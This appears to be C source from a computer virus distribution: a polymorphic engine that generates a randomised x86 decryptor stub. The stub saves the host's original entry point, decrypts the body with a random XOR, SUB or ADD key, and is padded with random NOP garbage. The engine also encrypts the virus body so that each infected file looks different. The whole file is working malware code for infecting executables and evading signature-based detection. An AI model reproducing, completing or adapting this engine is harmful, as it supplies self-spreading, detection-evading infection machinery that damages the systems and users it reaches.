/*
 *	By using this file, you agree to the terms and conditions set
 *	forth in the COPYING file which can be found at the top level
 *	of this distribution.
 */
#include <virus.h>
#include <mcmd.h>

static uint random(uint *seed)
{
	return (*seed = (*seed * 214013 + 2531011));
}

#define	IF(x)	if (cmd == x)
static inline void mk_cmd(unsigned char **buf, int cmd, int a1, int a2)
{
	unsigned char	d, *c = *buf;
	unsigned int	a;

	IF(C_NOP) 		{ d = 0x90; goto mk1; }
	IF(C_RET)		{ d = 0xc3; goto mk1; }
	IF(C_PUSHA)		{ d = 0x60; goto mk1; }
	IF(C_POPA)		{ d = 0x61; goto mk1; }
	IF(C_INC_R)		{ d = 0x40 | (uchar)a1;
mk1:		*c++ = d;
	}

	IF(C_JCC) {
		*c++ = 0x70 | (uchar)a1;
		goto put_a2;
	}
	
	IF(C_XOR_MR_C8)		{ d = 0x30; goto mk3; }
	IF(C_SUB_MR_C8)		{ d = 0x28; goto mk3; }
	IF(C_ADD_MR_C8)		{ d = 0x00;
mk3:		*c++ = 0x80;
		*c++ = d | (uchar)a1;
put_a2:		*c++ = (uchar)a2;	
	}

	IF(C_PUSH_C)		{ d = 0x68; goto mk5_a1; }
	IF(C_CALL_C)		{ d = 0xe8;
mk5_a1:		a = a1;
		goto mk5;
	}
	IF(C_MOV_R_C) 		{ d = 0xb8 | (uchar)a1;
		a = a2;
mk5:		*c++ = d;
		goto put_dword;
	}
	
	IF(C_CMP_R_C) {
		*c++ = 0x81;
		*c++ = 0xf8 | (uchar)a1;
		a = a2;
put_dword:	*(uint*)c = a;
		c += 4;
	}
	*buf = c;
}

static inline void garbage(unsigned char **buf, int c)
{
	int i;
	
	for (i = 0; i < c; i++)
		mk_cmd(buf, C_NOP, 0, 0);
}

#define	MK(args...)	gb();mk(&c, args)
#define MK_ARGS		(uchar**,int,int,int)
int make_body(uint oentry, uint nentry, uint vstart, uint vsize, uchar *buf)
{
	unsigned int	seed, i, dl, o1, o2, o3;
	unsigned char	key, op, r, *c;
	register void	(*mk)MK_ARGS = (void (*)MK_ARGS)
				(vstart + ((uint)mk_cmd - (uint)start));
	void gb(void) {
		garbage(&c, random(&seed) & 7);
	}

	INIT_SEED(seed)
	key	= random(&seed) & 0xff;
	op 	= key % 3;
	c	= buf;	
	while (r = random(&seed) % 7, r == 4 || r == 5);
	
	MK(C_PUSH_C,	oentry, 0);	/* push old_entry 	*/
	MK(C_PUSHA,	0, 0);		/* pusha 		*/
	MK(C_MOV_R_C,	r, 0);		/* mov r, start 	*/
					/* loop:		*/
		o1 = (uint)(c - 4);	/* offset of start value*/
		o2 = (uint)c;		/* offset of loop label	*/
	if (op == 0)		i = C_XOR_MR_C8;
	else if (op == 1)	i = C_SUB_MR_C8;
	else			i = C_ADD_MR_C8;
	MK(i,	r,	key);		/* xor/sub/add [r], key	*/
	MK(C_INC_R,	r, 0);		/* inc r		*/
	MK(C_CMP_R_C,	r, 0);		/* cmp r, end		*/
		o3 = (uint)(c - 4);	/* offset of end value	*/
	MK(C_JCC, JCC_JB, o2-(int)c-2);	/* jb loop		*/
	MK(C_CALL_C,	0, 0);		/* call start()		*/
		o2 = (uint)(c - 4);	/* offset of call addr 	*/
	MK(C_POPA,	0, 0);		/* popa			*/
	MK(C_RET,	0, 0);		/* ret			*/

	dl		= c - buf;
	i		= nentry + dl;
	*(uint*)o1 	= i;
	*(uint*)o3	= i + vsize;
	*(uint*)o2	= (uint)c - o2 - 4;

	for (i = 0; i < vsize; i++, c++) {
		r = *(uchar*)(vstart + i);
		if (op == 0)		r ^= key;
		else if (op == 1)	r += key;
		else			r -= key;
		*c = r;
	}

	return (vsize + dl);
}
